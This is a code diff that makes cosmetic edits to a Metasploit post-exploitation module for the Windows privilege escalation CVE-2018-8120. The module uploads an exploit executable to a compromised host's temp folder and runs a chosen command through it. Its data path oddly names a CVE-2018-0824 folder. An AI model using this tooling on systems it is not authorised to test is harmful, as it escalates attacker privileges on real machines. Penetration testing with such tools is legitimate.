@@ -22,10 +22,10 @@ class MetasploitModule < Msf::Post
         [
           ['BID', '104034'],
           ['CVE', '2018-8120'],
-          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120'],
-          ['URL', 'http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html'],
           ['URL', 'https://github.com/bigric3/cve-2018-8120'],
-          ['URL', 'https://github.com/unamer/CVE-2018-8120']
+          ['URL', 'https://github.com/unamer/CVE-2018-8120'],
+          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120'],
+          ['URL', 'http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html']
         ],
       'Author'      =>
         [
@@ -42,18 +42,18 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-         OptString.new('POCCMD', [true, 'The command to run from CVE-2018-8120']),
+         OptString.new('POCCMD', [true, 'The command to run from CVE-2018-8120.exe']),
       ])
   end
 
    def write_exe_to_target(rexe, rexename)
      begin
-       print_warning("writing to %TEMP%")
+       print_warning("Writing file to temp")
        temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
        write_file_to_target(temprexe,rexe)
      end
-    print_good("Persistent Script written to #{temprexe}")
-    temprexe
+       print_good("File path on remote system: #{temprexe}")
+       temprexe
    end
 
    def write_file_to_target(temprexe,rexe)
@@ -63,20 +63,20 @@ class MetasploitModule < Msf::Post
    end
 
    def create_payload_from_file(exec)
-      print_status("Reading Payload from file #{exec}")
+      print_status("Reading file from: #{exec}")
       ::IO.read(exec)
    end
 
    def run
       rexename =  Rex::Text.rand_text_alphanumeric(10) + ".exe"
-      print_status("exe name is: #{rexename}")
+      print_status("EXE name is: #{rexename}")
       poccmd =  datastore['POCCMD']
 
       rexe = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'CVE-2018-8120.exe')
       raw = create_payload_from_file rexe
       script_on_target = write_exe_to_target(raw, rexename)
 
-      print_status('Starting module..')
+      print_status('Initiating module...')
       print_line
 
       command = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
@@ -87,6 +87,5 @@ class MetasploitModule < Msf::Post
       command_output = cmd_exec(command)
       print_line(command_output)
       print_line
-
   end
 end
